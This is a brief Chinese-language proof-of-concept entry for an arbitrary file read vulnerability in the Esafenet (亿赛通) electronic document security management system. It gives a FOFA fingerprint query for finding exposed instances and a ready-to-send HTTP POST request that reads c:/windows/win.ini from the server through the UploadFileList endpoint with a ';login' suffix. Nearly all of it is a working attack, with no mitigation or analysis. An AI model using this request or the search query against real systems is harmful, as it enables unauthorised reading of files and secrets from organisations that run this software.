## 亿赛通电子文档安全管理系统UploadFileList任意文件读取漏洞

## fofa
```
app="亿赛通-电子文档安全管理系统"
```

## poc
```
POST /CDGServer3/document/UploadFileList;login HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
```
